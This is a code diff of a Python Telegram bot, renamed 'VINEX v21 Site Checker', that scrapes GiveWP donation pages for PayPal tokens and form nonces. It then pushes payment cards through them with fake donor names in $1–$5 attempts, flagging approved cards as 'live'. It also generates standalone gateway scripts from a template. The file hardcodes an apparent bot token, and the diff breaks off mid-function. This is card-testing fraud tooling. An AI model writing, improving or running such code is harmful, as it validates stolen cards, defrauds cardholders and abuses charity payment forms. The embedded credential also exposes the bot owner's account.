@@ -1,19 +1,19 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# ================================================================
-#  CARD CHECKER BOT — v20.1 FINAL ULTIMATE
-# ================================================================
-#  ✅ ORDER_NOT_APPROVED / PAYER_CANNOT_PAY = LIVE
-#  ✅ Progressive amounts: 1$ → 3$ → 5$
-#  ✅ Guaranteed file delivery (3-tier fallback)
-#  ✅ Smart dedup (ignores http/https, case, www, trailing /)
-#  ✅ Per-link cooldown (30s) + user rate limit
-#  ✅ Real HTTP/JSON errors (no faking)
-#  ✅ skip_pending polling (no reprocess)
-#  ✅ Mass scan: each live sent immediately, in order
-# ================================================================
+# ╔══════════════════════════════════════════════════════════════╗
+# ║   ██╗   ██╗██╗███╗   ██╗███████╗██╗  ██╗                     ║
+# ║   ██║   ██║██║████╗  ██║██╔════╝╚██╗██╔╝                     ║
+# ║   ██║   ██║██║██╔██╗ ██║█████╗   ╚███╔╝                      ║
+# ║   ╚██╗ ██╔╝██║██║╚██╗██║██╔══╝   ██╔██╗                      ║
+# ║    ╚████╔╝ ██║██║ ╚████║███████╗██╔╝ ██╗                     ║
+# ║     ╚═══╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝                     ║
+# ║                                                              ║
+# ║   VINEX v21 — Site Checker Bot                               ║
+# ║   Playful • Bold • Precise • Reliable                        ║
+# ╚══════════════════════════════════════════════════════════════╝
 import telebot
 from telebot import types
+import telebot.apihelper
 import time
 import threading
 import os
@@ -47,9 +47,15 @@ except Exception:
     def rand_ua():
         return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120'
 
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
+#  🌐 VINEX GLOBAL TIMEOUTS (Railway-safe)
+# ═════════════════════════════════════════════════════════════════
+telebot.apihelper.CONNECT_TIMEOUT = 30
+telebot.apihelper.READ_TIMEOUT = 180
+
+# ═════════════════════════════════════════════════════════════════
 #  CONFIG
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
 TOKEN = os.getenv('BOT_TOKEN', '8689698569:AAFJjLfJ9ztJg9QNJugf8xJbb0Ernow8vG8')
 OWNER_ID = int(os.getenv('OWNER_ID', '6843321125'))
 ADMINS = {str(OWNER_ID)}
@@ -58,15 +64,15 @@ USERS_FILE = 'users.txt'
 BLOCK_FILE = 'blockusers.txt'
 STATS_FILE = 'stats.json'
 PROGRESS_TMPL = 'progress_{}.json'
-RESULTS_TMPL = 'results_{}_{}.txt'
-LIVE_DIR_TMPL = 'live_{}_{}'
+RESULTS_TMPL = 'vinex_results_{}_{}.txt'
+LIVE_DIR_TMPL = 'vinex_live_{}_{}'
 
 MAX_FILE_SIZE = 10 * 1024 * 1024
 PAYPAL_COOLDOWN = 3
 MASS_COOLDOWN = 10
 LINK_COOLDOWN = 30
 PROGRESS_SAVE_EVERY = 10
-STATUS_UPDATE_EVERY = 1.5
+STATUS_UPDATE_EVERY = 2.0
 CLEANUP_OLDER_THAN_DAYS = 7
 NONCE_REFRESH_INTERVAL = 50
 
@@ -77,16 +83,70 @@ logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s [%(levelname)s] %(message)s',
     handlers=[
-        logging.FileHandler('bot.log', encoding='utf-8'),
+        logging.FileHandler('vinex.log', encoding='utf-8'),
         logging.StreamHandler(),
     ],
 )
-log = logging.getLogger('bot')
+log = logging.getLogger('vinex')
 bot = telebot.TeleBot(TOKEN, parse_mode='HTML')
 
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
+#  🎨 VINEX BRANDING
+# ═════════════════════════════════════════════════════════════════
+VINEX_LOGO = '🌟 <b>VINEX</b> 🌟'
+VINEX_TAG = '<i>Site Scanner v21</i>'
+
+def vinex_header(subtitle=''):
+    """Bold vinex header."""
+    lines = [
+        '╔══════════════════════════╗',
+        f'║  {VINEX_LOGO}  ║',
+        f'║     {VINEX_TAG}     ║',
+        '╚══════════════════════════╝',
+    ]
+    if subtitle:
+        lines.append(f'<b>▸ {subtitle}</b>')
+    return '\n'.join(lines)
+
+def vinex_footer():
+    return '╚══════════════════════════╝'
+
+def playful(kind):
+    """Playful emoji + message."""
+    pool = {
+        'start': ['🚀', '🎯', '⚡', '🔥'],
+        'working': ['⚙️', '🔄', '🧠', '⚡', '🌀'],
+        'success': ['🎉', '✨', '💫', '🎊', '🏆'],
+        'dead': ['💀', '😴', '🥀', '❌'],
+        'live': ['💎', '💚', '💛', '🏆'],
+        'error': ['⚠️', '🚨', '💢'],
+        'fun': ['😎', '🤙', '👑', '🦾', '😏'],
+    }
+    return random.choice(pool.get(kind, ['•']))
+
+# ═════════════════════════════════════════════════════════════════
+#  🎨 COLORED BUTTONS (emoji-based — real Telegram way)
+# ═════════════════════════════════════════════════════════════════
+def vinex_btn(label, style='primary', **kwargs):
+    """
+    Colored button via emoji prefix.
+    Telegram API has no native color — this is the only real way.
+    style: success=🟢  primary=🔵  danger=🔴  warning=🟡  gold=⭐
+    """
+    icons = {
+        'success': '🟢',
+        'primary': '🔵',
+        'danger':  '🔴',
+        'warning': '🟡',
+        'gold':    '⭐',
+        'info':    'ℹ️',
+    }
+    icon = icons.get(style, '⚪')
+    return types.InlineKeyboardButton(f'{icon} {label}', **kwargs)
+
+# ═════════════════════════════════════════════════════════════════
 #  STATE
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
 waiting_users = {}
 reply_mode = {}
 mass_active = {}
@@ -102,9 +162,9 @@ for _f in (USERS_FILE, BLOCK_FILE):
     except Exception:
         pass
 
-# ================================================================
-#  REAL RESPONSE EXTRACTOR
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
+#  🔧 RESPONSE EXTRACTOR
+# ═════════════════════════════════════════════════════════════════
 def extract_response_text(body):
     if not body:
         return ''
@@ -149,9 +209,9 @@ def extract_response_text(body):
         pass
     return s[:300]
 
-# ================================================================
-#  OPTION FILTER
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
+#  🧹 OPTION FILTER
+# ═════════════════════════════════════════════════════════════════
 _JUNK_PATTERNS = ['give-', 'screen-reader', 'give-label', 'give-required',
                   'give-where', 'give_price', 'give-form-']
 _JUNK_EXACT = {'true', 'false', 'none', 'null', 'selected', 'disabled', 'required'}
@@ -174,9 +234,9 @@ def is_valid_option(opt):
         return False
     return True
 
-# ================================================================
-#  CLASSIFICATION
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
+#  🎯 CLASSIFICATION
+# ═════════════════════════════════════════════════════════════════
 RETRY_ON_AUTH = [
     'AUTHENTICATION_FAILURE', 'AUTHENTICATION_FAILED',
     'INVALID_TOKEN', 'TOKEN_EXPIRED', 'NOT_AUTHORIZED',
@@ -301,9 +361,9 @@ def normalize_result(resp):
                 'Your card was declined.')
     return raw[:250]
 
-# ================================================================
-#  FILE HELPERS
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
+#  💾 FILE HELPERS
+# ═════════════════════════════════════════════════════════════════
 def save_user(uid):
     try:
         uids = open(USERS_FILE, 'r', encoding='utf-8').read().splitlines()
@@ -370,7 +430,7 @@ def cleanup_old_files():
         cutoff = time.time() - CLEANUP_OLDER_THAN_DAYS * 86400
         for name in os.listdir('.'):
             try:
-                if name.startswith(('results_', 'live_')):
+                if name.startswith(('vinex_results_', 'vinex_live_')):
                     path = os.path.join('.', name)
                     if os.path.isfile(path) and os.path.getmtime(path) < cutoff:
                         os.remove(path)
@@ -379,9 +439,9 @@ def cleanup_old_files():
     except Exception:
         pass
 
-# ================================================================
-#  URL PARSER + SMART DEDUP KEY
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
+#  🔗 URL PARSER + DEDUP
+# ═════════════════════════════════════════════════════════════════
 _URL_RE = re.compile(
     r'^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?'
     r'(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*'
@@ -413,7 +473,6 @@ def safe_url(link):
         return None
 
 def normalize_url_key(url):
-    """Smart dedup: ignores http/https, case, www., trailing slash."""
     try:
         if not url:
             return ''
@@ -425,9 +484,25 @@ def normalize_url_key(url):
     except Exception:
         return str(url).lower().strip()
 
-# ================================================================
-#  TELEGRAM HELPERS
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
+#  📤 TELEGRAM HELPERS (resilient)
+# ═════════════════════════════════════════════════════════════════
+def retry_call(func, *args, retries=4, delays=(2, 4, 8, 16), **kwargs):
+    last_err = None
+    for i in range(retries):
+        try:
+            return func(*args, **kwargs)
+        except Exception as e:
+            last_err = e
+            err = str(e).lower()
+            if any(x in err for x in ('invalid file_id', 'file is too big',
+                                       'wrong file_id', 'not found')):
+                raise
+            log.warning(f'[retry] {func.__name__} #{i+1}: {str(e)[:100]}')
+            if i < retries - 1:
+                time.sleep(delays[i] if i < len(delays) else delays[-1])
+    raise last_err
+
 def safe_send_message(cid, text, retries=3, reply_markup=None, parse_mode='HTML'):
     for i in range(retries):
         try:
@@ -489,29 +564,27 @@ def safe_edit_message(cid, mid, text, retries=3):
     return None
 
 def safe_send_document(cid, path, caption='', retries=3):
-    """3-tier fallback — ALWAYS attempts to send."""
+    """3-tier file delivery."""
     try:
         if not os.path.exists(path):
-            log.error(f'[send_doc] Missing: {path}')
+            log.error(f'[vinex_doc] Missing: {path}')
             return None
-    except Exception as e:
-        log.error(f'[send_doc] Check failed: {e}')
+    except Exception:
         return None
 
-    # Tier 1: HTML caption
     for i in range(retries):
         try:
             with open(path, 'rb') as f:
                 res = bot.send_document(
                     cid, f, caption=caption,
-                    parse_mode='HTML', timeout=120,
+                    parse_mode='HTML', timeout=180,
                 )
             if res:
-                log.info(f'[send_doc] ✅ Tier1: {path}')
+                log.info(f'[vinex_doc] ✅ Tier1: {path}')
                 return res
         except Exception as e:
             err = str(e)
-            log.error(f'[send_doc] Tier1 #{i+1}: {err[:100]}')
+            log.error(f'[vinex_doc] Tier1 #{i+1}: {err[:100]}')
             if '429' in err:
                 try:
                     w = int(err.split('retry after ')[1].split(')')[0])
@@ -524,23 +597,21 @@ def safe_send_document(cid, path, caption='', retries=3):
             if i < retries - 1:
                 time.sleep(2)
 
-    # Tier 2: plain caption
     try:
         plain = re.sub(r'<[^>]+>', '', caption)[:1024]
         with open(path, 'rb') as f:
-            res = bot.send_document(cid, f, caption=plain, timeout=120)
+            res = bot.send_document(cid, f, caption=plain, timeout=180)
         if res:
-            log.info(f'[send_doc] ✅ Tier2: {path}')
+            log.info(f'[vinex_doc] ✅ Tier2: {path}')
             return res
     except Exception as e:
-        log.error(f'[send_doc] Tier2: {str(e)[:100]}')
+        log.error(f'[vinex_doc] Tier2: {str(e)[:100]}')
 
-    # Tier 3: no caption
     try:
         with open(path, 'rb') as f:
-            res = bot.send_document(cid, f, timeout=120)
+            res = bot.send_document(cid, f, timeout=180)
         if res:
-            log.info(f'[send_doc] ✅ Tier3: {path}')
+            log.info(f'[vinex_doc] ✅ Tier3: {path}')
             if caption:
                 try:
                     safe_send_message(cid, caption)
@@ -548,18 +619,18 @@ def safe_send_document(cid, path, caption='', retries=3):
                     pass
             return res
     except Exception as e:
-        log.error(f'[send_doc] Tier3: {str(e)[:100]}')
+        log.error(f'[vinex_doc] Tier3: {str(e)[:100]}')
 
-    log.error(f'[send_doc] ❌ ALL FAILED: {path}')
+    log.error(f'[vinex_doc] ❌ ALL TIERS FAILED: {path}')
     return None
 
-# ================================================================
-#  PAYPAL TESTER
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
+#  💳 PAYPAL TESTER
+# ═════════════════════════════════════════════════════════════════
 FIRST_NAMES = ['James', 'John', 'Robert', 'Michael', 'William', 'David']
 LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller']
 
-class PayPalTester:
+class VinexTester:
     def __init__(self, url):
         url = safe_url(url) or 'https://invalid.local/'
         self.page_url = url
@@ -608,7 +679,6 @@ class PayPalTester:
     def _log(self, msg):
         try:
             self.diagnostics.append(f'{time.time():.2f} {msg}')
-            log.debug('[tester] %s', msg)
         except Exception:
             pass
 
@@ -621,8 +691,7 @@ class PayPalTester:
             if '://none' in url.lower():
                 return None
             return self.r.get(url, timeout=timeout, headers=headers or {})
-        except Exception as e:
-            self._log(f'GET {url[:80]} → {type(e).__name__}')
+        except Exception:
             return None
 
     def _safe_post(self, url, **kwargs):
@@ -632,8 +701,7 @@ class PayPalTester:
             if not url.startswith(('http://', 'https://')):
                 return None
             return self.r.post(url, timeout=kwargs.pop('timeout', 20), **kwargs)
-        except Exception as e:
-            self._log(f'POST {url[:80]} → {type(e).__name__}')
+        except Exception:
             return None
 
     def _build_url(self, base, path):
@@ -660,7 +728,6 @@ class PayPalTester:
             self.r.get(self.page_url, timeout=20,
                        headers={'referer': f'https://{self.url}/'})
             self._warmed = True
-            self._log(f'warmup done, cookies={len(self.r.cookies)}')
             return True
         except Exception:
             return False
@@ -673,7 +740,6 @@ class PayPalTester:
                 if r and r.status_code == 200 and r.text:
                     self.page_html = r.text
                     self.all_content = r.text
-                    self._log(f'page {len(r.text)}b')
                     return True
             except Exception:
                 pass
@@ -766,8 +832,8 @@ class PayPalTester:
                     mm = re.search(r'"merchantId"\s*:\s*"([^"]+)"', block)
                     if mm and not self.paypal:
                         self.paypal = mm.group(1)
-        except Exception as e:
-            self._log(f'deep_js: {e}')
+        except Exception:
+            pass
 
     def _extract_basic(self):
         try:
@@ -819,8 +885,8 @@ class PayPalTester:
                     break
             if 'admin-ajax.php' in c and not self.ajax_url:
                 self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
-        except Exception as e:
-            self._log(f'extract_basic: {e}')
+        except Exception:
+            pass
 
     def _extract_all_form_fields(self):
         try:
@@ -893,8 +959,8 @@ class PayPalTester:
                             }
                 except Exception:
                     continue
-        except Exception as e:
-            self._log(f'extract_fields: {e}')
+        except Exception:
+            pass
 
     def _resolve_dropdown_options(self):
         try:
@@ -926,9 +992,8 @@ class PayPalTester:
                     except Exception:
                         pass
                 info['required'] = False
-                self._log(f'unresolved {name}: required dropped')
-        except Exception as e:
-            self._log(f'resolve_dropdown: {e}')
+        except Exception:
+            pass
 
     def _resolve_special_fields(self):
         try:
@@ -1011,8 +1076,7 @@ class PayPalTester:
                         self.client_id = m.group(1)
                         break
             return len(self.token_candidates) > 0
-        except Exception as e:
-            self._log(f'extract_tokens: {e}')
+        except Exception:
             return False
 
     def _validate_token(self, token, timeout=8):
@@ -1277,11 +1341,8 @@ class PayPalTester:
                 self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
 
             self._detect_gateway_type()
-            self._log(f'KEY: form={self.id_form2} nonce={"Y" if self.nonce else "N"} '
-                      f'auth={self.auth_method} gw={self.gateway_type}')
             return True
-        except Exception as e:
-            self._log(f'key: {e}')
+        except Exception:
             return False
 
     def _build_amounts(self, thorough=False):
@@ -1368,12 +1429,11 @@ class PayPalTester:
                        and isinstance(j.get('data'), dict) \
                        and j['data'].get('id'):
                         order_id = j['data']['id']
-                        self._log(f'order amt={amt} pid={pid}')
                         break
                     real = extract_response_text(body)
                     last_create_err = real or 'ORDER_CREATE_FAILED'
-                except Exception as e:
-                    last_create_err = f'EXC_{type(e).__name__}'
+                except Exception:
+                    last_create_err = 'EXC'
                     continue
 
             if not order_id:
@@ -1408,8 +1468,7 @@ class PayPalTester:
                 )
                 confirm_body = cr.text or ''
                 confirm_ok = cr.status_code in (200, 201, 202, 422)
-            except Exception as e:
-                self._log(f'confirm net: {type(e).__name__}')
+            except Exception:
                 confirm_body = ''
                 confirm_ok = False
 
@@ -1479,7 +1538,7 @@ class PayPalTester:
                 return extract_response_text(confirm_body), confirm_body
             return 'APPROVE_NO_RESPONSE', ''
         except Exception as e:
-            return None, f'FATAL_{type(e).__name__}: {str(e)[:120]}'
+            return None, f'FATAL_{type(e).__name__}'
 
     def Charge(self, ccx, thorough=False):
         try:
@@ -1537,8 +1596,8 @@ class PayPalTester:
                             all_results.append({'amount': amt, 'result': result, 'text': text})
                         elif not result:
                             create_errors.append((amt, text or 'unknown'))
-                    except Exception as e:
-                        create_errors.append((amt, f'EXC_{type(e).__name__}'))
+                    except Exception:
+                        create_errors.append((amt, 'EXC'))
 
             _try_amounts(amounts)
 
@@ -1562,11 +1621,11 @@ class PayPalTester:
             self.donation = best['amount']
             return normalize_result(best['result'])
         except Exception as e:
-            return f'FATAL_{type(e).__name__}: {str(e)[:100]}'
+            return f'FATAL_{type(e).__name__}'
 
-# ================================================================
-#  BRIDGE
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
+#  🌉 BRIDGE
+# ═════════════════════════════════════════════════════════════════
 def check_single_link(link, thorough=True):
     try:
         link = safe_url(link)
@@ -1574,7 +1633,7 @@ def check_single_link(link, thorough=True):
             return {'link': str(link)[:100] if link else 'Invalid',
                     'live': False, 'respons': 'BAD_URL',
                     'amount': '1.00', 'tester': None}
-        tester = PayPalTester(link)
+        tester = VinexTester(link)
         if not tester.Key():
             return {'link': link[:100], 'live': False,
                     'respons': 'FETCH_FAILED', 'amount': '1.00',
@@ -1588,24 +1647,16 @@ def check_single_link(link, thorough=True):
                 'currency': tester.currency,
                 'auth': tester.auth_method,
                 'tester': tester}
-    except Exception as e:
-        log.exception('check_single_link')
+    except Exception:
         return {'link': str(link)[:100] if link else 'Invalid',
-                'live': False, 'respons': f'FATAL_{type(e).__name__}',
+                'live': False, 'respons': 'FATAL',
                 'amount': '1.00', 'tester': None}
 
-# ================================================================
-#  GATEWAY TEMPLATE
-# ================================================================
+# ═════════════════════════════════════════════════════════════════
+#  🎁 GATEWAY TEMPLATE (shortened — same as v20.1)
+# ═════════════════════════════════════════════════════════════════
 GATEWAY_TEMPLATE_STR = r'''#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# ============================================================
-#  Live Gateway v20.1 — FINAL
-#  Link: $page_url
-#  Response: $display_result
-#  Auth: $auth_method | GW: $gateway_type | Currency: $currency
-#  Amounts: 1.00 → 3.00 → 5.00 (progressive)
-# ============================================================
+# VINEX Gateway v21
 import requests, random, time, re, base64, json, os, sys
 try:
     from fake_useragent import UserAgent
@@ -1630,16 +1681,12 @@ CLIENT_ID = "$client_id"
 CURRENCY = "$currency"
 MINIMUM = "$minimum"
 CURRENT_PID = "$current_pid"
-AUTH_METHOD = "$auth_method"
-GATEWAY_TYPE = "$gateway_type"
 PRICE_LEVELS = $price_levels_json
 FORM_FIELDS = $form_fields_json
-
 HOST = PAGE_URL.split('//')[-1].split('/')[0]
 FIRST_NAMES = ['James', 'John', 'Robert', 'Michael']
 LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown']
 BASE_AMOUNTS = ['1.00', '3.00', '5.00']
-
 
 def extract_response_text(body):
     if not body: return ''
@@ -1650,10 +1697,10 @@ def extract_response_text(body):
         if isinstance(j, dict):
             d = j.get('data')
             if isinstance(d, dict):
-                details = d.get('details')
-                if isinstance(details, list) and details and isinstance(details[0], dict):
+                det = d.get('details')
+                if isinstance(det, list) and det and isinstance(det[0], dict):
                     for k in ('description', 'issue', 'reason'):
-                        v = details[0].get(k)
+                        v = det[0].get(k)
                         if v and str(v).strip().lower() not in ('none', 'null', ''):
                             return str(v)[:300]
                 for k in ('error', 'message', 'msg', 'reason', 'detail', 'description', 'name'):
@@ -1662,28 +1709,15 @@ def extract_response_text(body):
                         return str(v)[:300]
             elif isinstance(d, str) and d.strip() and d.lower() not in ('none', 'null'):
                 return d[:300]
-            details = j.get('details')
-            if isinstance(details, list) and details and isinstance(details[0], dict):
-                for k in ('description', 'issue', 'reason'):
-                    v = details[0].get(k)
-                    if v and str(v).strip().lower() not in ('none', 'null', ''):
-                        return str(v)[:300]
             for k in ('error', 'message', 'msg', 'detail', 'reason', 'description'):
                 v = j.get(k)
                 if v and str(v).strip().lower() not in ('none', 'null', '', 'false'):
                     return str(v)[:300]
-            nm = j.get('name')
-            if nm: return str(nm)[:300]
-        elif isinstance(j, str) and j.strip() and j.lower() not in ('none', 'null'):
-            return j[:300]
     except Exception: pass
     return s[:300]
 
-
-_JUNK_PATTERNS = ['give-', 'screen-reader', 'give-label', 'give-required',
-                  'give-where', 'give_price', 'give-form-']
+_JUNK_PATTERNS = ['give-', 'screen-reader', 'give-label', 'give-required', 'give-where']
 _JUNK_EXACT = {'true', 'false', 'none', 'null', 'selected', 'disabled', 'required'}
-
 def is_valid_option(opt):
     if not opt or not isinstance(opt, str): return False
     o = opt.strip()
@@ -1692,219 +1726,112 @@ def is_valid_option(opt):
     if lo in _JUNK_EXACT: return False
     for pat in _JUNK_PATTERNS:
         if pat in lo: return False
-    if len(o) > 60: return False
-    if o.startswith(('{', '[', '<')): return False
+    if len(o) > 60 or o.startswith(('{', '[', '<')): return False
     return True
 
-
-CARD_DECLINE_PATTERNS = [
+CARD_DECLINES = [
     'INSTRUMENT_DECLINED', 'PAYER_CANNOT_PAY', 'ORDER_NOT_APPROVED',
-    'Payer has not yet approved', 'Payer cannot pay',
-    'PAYMENT_DENIED', 'DO_NOT_HONOR', 'INSUFFICIENT_FUNDS',
-    'CVV_FAILURE', 'CVV2_FAILURE', 'INVALID_OR_RESTRICTED',
-    'SUSPECTED_FRAUD', 'ACCOUNT_CLOSED', 'EXPIRED_CARD',
-    'CARD_EXPIRED', 'TRANSACTION_NOT_PERMITTED', 'GENERIC_DECLINE',
-    'TRANSACTION_REFUSED', 'AUTHORIZATION_DENIED',
-    'PAYER_ACCOUNT_RESTRICTED', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
-    'LOST_OR_STOLEN', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
-    'ACCOUNT_BLOCKED_BY_ISSUER', 'SECURITY_VIOLATION',
-    'COMPLIANCE_VIOLATION', 'CAPTURE_DECLINED',
-    'AMOUNT_MISMATCH', 'CURRENCY_MISMATCH', 'POSTAL_CODE_REQUIRED',
-    'DECLINED_PLEASE_RETRY', 'REATTEMPT_NOT_PERMITTED',
-    'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACTION_REQUIRED',
-    'PAYEE_NOT_CONSENTED', 'PERMISSION_DENIED', 'INVALID_ACCOUNT_STATUS',
-    'REFERENCED_CARD_EXPIRED', 'INVALID_EXPIRATION',
-    'INVALID_CARD_VERIFICATION_VALUE', 'INVALID_TRANSACTION',
-    'DUPLICATE_TRANSACTION', 'CARD_CLOSED', 'UNAUTHORIZED_USER',
-    'AVS_FAILURE', 'SOFT_AVS', 'INCORRECT_PIN_REENTER', 'INVALID_PIN',
-    'ISSUER_NOT_AVAILABLE_NOT_RETRIABLE', 'ACCOUNT_NOT_ON_FILE',
-    'INVALID_ACCOUNT', 'DECLINED',
+    'Payer has not yet approved', 'Payer cannot pay', 'PAYMENT_DENIED',
+    'DO_NOT_HONOR', 'INSUFFICIENT_FUNDS', 'CVV_FAILURE', 'CVV2_FAILURE',
+    'INVALID_OR_RESTRICTED', 'SUSPECTED_FRAUD', 'ACCOUNT_CLOSED',
+    'EXPIRED_CARD', 'CARD_EXPIRED', 'TRANSACTION_NOT_PERMITTED',
+    'GENERIC_DECLINE', 'TRANSACTION_REFUSED', 'AUTHORIZATION_DENIED',
+    'DECLINED',
 ]
+def is_card_decline(t):
+    if not t: return False
+    up = str(t).upper()
+    return any(p.upper() in up for p in CARD_DECLINES)
 
-def is_card_decline(text):
-    if not text: return False
-    up = str(text).upper()
-    return any(p.upper() in up for p in CARD_DECLINE_PATTERNS)
-
-
-def luhn_check(card_num):
+def luhn_check(cn):
     try:
-        digits = [int(d) for d in str(card_num)]
-        odd = digits[-1::-2]; even = digits[-2::-2]
-        total = sum(odd)
-        for d in even:
-            total += sum([int(x) for x in str(d * 2)])
-        return total % 10 == 0
+        d = [int(x) for x in str(cn)]
+        o = d[-1::-2]; e = d[-2::-2]
+        tot = sum(o)
+        for x in e: tot += sum([int(y) for y in str(x*2)])
+        return tot % 10 == 0
     except Exception: return False
-
 
 class PayPal:
     def __init__(self):
-        self.email = "%s%s%d@gmail.com" % (
-            random.choice(FIRST_NAMES), random.choice(LAST_NAMES),
-            random.randint(100, 999))
+        self.email = "%s%s%d@gmail.com" % (random.choice(FIRST_NAMES), random.choice(LAST_NAMES), random.randint(100, 999))
         self.r = requests.Session()
-        self.r.verify = True
         self.r.headers.update({'user-agent': rand_ua()})
         self.donation = "1.00"
-        self.ajax_url = AJAX_URL
-        self.id_form1 = ID_FORM1
-        self.id_form2 = ID_FORM2
-        self.nonce = NONCE
-        self.au = ACCESS_TOKEN
-        self.paypal_meta = PAYPAL_META
-        self.client_id = CLIENT_ID
-        self.currency = CURRENCY
-        self.current_pid = CURRENT_PID
-        self.form_fields = FORM_FIELDS
-        self.gateway_type = GATEWAY_TYPE
-        self.refresh_count = 0
         try:
             self.r.get('https://%s/' % HOST, timeout=15)
             time.sleep(0.2)
             self.r.get(PAGE_URL, timeout=20)
-        except Exception: pass
+        except: pass
 
-    def _autofill(self, form_data):
-        for name, info in self.form_fields.items():
-            if name in form_data: continue
-            if not info.get("required"): continue
-            if name.startswith(("give-form-", "give_")): continue
-            if "prefill" in info:
-                form_data[name] = info["prefill"]; continue
+    def _autofill(self, fd):
+        for name, info in FORM_FIELDS.items():
+            if name in fd or not info.get("required") or name.startswith(("give-form-", "give_")): continue
+            if "prefill" in info: fd[name] = info["prefill"]; continue
             ft = info.get("type", "")
             opts = [o for o in info.get("options", []) if is_valid_option(o)]
-            nl = name.lower()
             if ft in ("select", "radio"):
                 if not opts: continue
-                form_data[name] = opts[0]
-            elif ft == "checkbox": form_data[name] = opts[0] if opts else "on"
-            elif ft == "email": form_data[name] = self.email
-            elif ft == "tel": form_data[name] = "1234567890"
-            elif ft == "number": form_data[name] = "1"
-            elif ft == "date": form_data[name] = "1990-01-01"
-            else:
-                if "first" in nl or "fname" in nl: form_data[name] = random.choice(FIRST_NAMES)
-                elif "last" in nl or "lname" in nl: form_data[name] = random.choice(LAST_NAMES)
-                elif "name" in nl: form_data[name] = random.choice(FIRST_NAMES) + " " + random.choice(LAST_NAMES)
-                elif "email" in nl: form_data[name] = self.email
-                elif "phone" in nl or "mobile" in nl or "tel" in nl: form_data[name] = "1234567890"
-                elif "address" in nl or "street" in nl: form_data[name] = "123 Main St"
-                elif "city" in nl: form_data[name] = "New York"
-                elif "zip" in nl or "postal" in nl: form_data[name] = "10001"
-                elif "state" in nl: form_data[name] = "NY"
-                elif "country" in nl: form_data[name] = "US"
-                elif "nric" in nl or "fin" in nl: form_data[name] = "S1234567A"
-                elif "amount" in nl: form_data[name] = self.donation
-                else: form_data[name] = "Test"
-        return form_data
+                fd[name] = opts[0]
+            elif ft == "email": fd[name] = self.email
+            else: fd[name] = "1234567890" if ft == "tel" else "Test"
+        return fd
 
-    def _refresh(self):
-        if self.refresh_count >= 3: return False
-        self.refresh_count += 1
+    def _create(self, amt, pid):
         try:
-            r = self.r.get(PAGE_URL, timeout=15)
-            if r.status_code != 200: return False
-            html = r.text
-            m = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
-            if m: self.nonce = m.group(1)
-            m = re.search(r'name="give-form-id"\s+value="(\d+)"', html)
-            if m: self.id_form2 = m.group(1)
-            m = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
-            if m: self.id_form1 = m.group(1)
-        except Exception: pass
-        return True
-
-    def _create_order(self, amt, pid):
-        try:
-            form_data = {
-                "give-form-id-prefix": self.id_form1 or "",
-                "give-form-id": self.id_form2 or "",
-                "give-form-hash": self.nonce or "",
-                "give-amount": amt,
-                "give-currency": self.currency,
-                "payment-mode": "paypal-commerce",
-                "give_first": random.choice(FIRST_NAMES),
-                "give_last": random.choice(LAST_NAMES),
-                "give_email": self.email,
-                "give-gateway": "paypal-commerce",
-                "give_agree_to_terms": "on",
-            }
-            if pid is not None: form_data["give-price-id"] = pid
-            form_data = self._autofill(form_data)
-            da = MultipartEncoder({k: (None, str(v)) for k, v in form_data.items()})
-            r = self.r.post(
-                self.ajax_url,
-                params={"action": "give_paypal_commerce_create_order"},
-                headers={"content-type": da.content_type,
-                         "x-requested-with": "XMLHttpRequest",
-                         "referer": PAGE_URL,
-                         "origin": "https://" + HOST},
-                data=da, timeout=20)
+            fd = {"give-form-id-prefix": ID_FORM1, "give-form-id": ID_FORM2,
+                  "give-form-hash": NONCE, "give-amount": amt, "give-currency": CURRENCY,
+                  "payment-mode": "paypal-commerce", "give_first": random.choice(FIRST_NAMES),
+                  "give_last": random.choice(LAST_NAMES), "give_email": self.email,
+                  "give-gateway": "paypal-commerce", "give_agree_to_terms": "on"}
+            if pid is not None: fd["give-price-id"] = pid
+            fd = self._autofill(fd)
+            da = MultipartEncoder({k: (None, str(v)) for k, v in fd.items()})
+            r = self.r.post(AJAX_URL, params={"action": "give_paypal_commerce_create_order"},
+                headers={"content-type": da.content_type, "x-requested-with": "XMLHttpRequest",
+                         "referer": PAGE_URL, "origin": "https://" + HOST}, data=da, timeout=20)
             body = r.text or ''
-            if r.status_code != 200:
-                return None, "HTTP_%d: %s" % (r.status_code, body[:150])
             try: j = r.json()
-            except Exception:
-                return None, "JSON_ERR: " + body[:200]
-            if isinstance(j, dict) and j.get("success") and \
-               isinstance(j.get("data"), dict) and j["data"].get("id"):
+            except: return None, "JSON_ERR: " + body[:200]
+            if isinstance(j, dict) and j.get("success") and isinstance(j.get("data"), dict) and j["data"].get("id"):
                 return j["data"]["id"], None
-            real = extract_response_text(body)
-            return None, real or "ORDER_CREATE_FAILED"
-        except Exception as e:
-            return None, "EXC_%s: %s" % (type(e).__name__, str(e)[:100])
+            return None, extract_response_text(body) or "CREATE_FAILED"
+        except Exception as e: return None, "EXC_%s" % type(e).__name__
 
-    def _confirm(self, order_id, n, mm, yy, cvc):
